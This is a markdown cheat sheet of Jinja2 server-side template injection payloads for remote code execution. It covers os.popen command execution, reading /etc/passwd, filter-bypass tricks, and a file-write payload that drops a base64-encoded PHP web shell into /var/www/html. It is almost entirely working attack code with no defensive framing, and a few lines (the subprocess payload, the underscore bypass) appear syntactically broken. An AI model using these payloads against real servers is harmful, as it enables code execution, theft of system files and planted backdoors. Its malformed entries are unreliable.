# Jinja2 SSTI Exploitation

## RCE Payloads

### Direct OS Access
```python
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() }}
```

### Via lipsum
```python
{{ lipsum.__globals__['os'].popen('id').read() }}
```

### Via request
```python
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### Via ''.__class__
```python
{{ ''.__class__.__mro__[1].__subclasses__() }}
# Find os._wrap_close or subprocess.Popen index
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['popen']('id').read() }}
```

### Via join for filter bypass
```python
{{ ''['__class__']['__mro__'][1]['__subclasses__']()[INDEX]['__init__']['__globals__']['popen']('id') }}
```

## File Read
```python
{{ config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['open']('/etc/passwd').read() }}
```

## File Write
```python
{{ config.__class__.__init__.__globals__['os'].popen('echo PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4= | base64 -d > /var/www/html/shell.php').read() }}
```

## Subprocess Module
```python
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['__import__('subprocess').check_output(['id']) }}
```

## Common Useful Classes
```python
# Find classes with popen
{{ ''.__class__.__mro__[1].__subclasses__() | select('attr','__init__') | select('attr','__globals__') | list }}

# os._wrap_close (common index around 132)
# subprocess.Popen
# warnings.catch_warnings
```

## Filter Bypass

### String Concatenation
```python
{{ ''['__cla'+'ss__']['__mr'+'o__'][1]['__subc'+'lasses__']() }}
```

### Char Conversion
```python
{{ chr(95)+chr(95)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(95)+chr(95) }}
```

### Request Parameter
```python
{{ ''.__class__.__mro__[1].__subclasses__()[request.args.x].__init__.__globals__['popen']('id').read() }}
# URL: ?x=INDEX
```

### Underscore Bypass
```python
{{ '\x5f\x5fclass\x5f\x5f'.__mro__[1].__subclasses__() }}
```
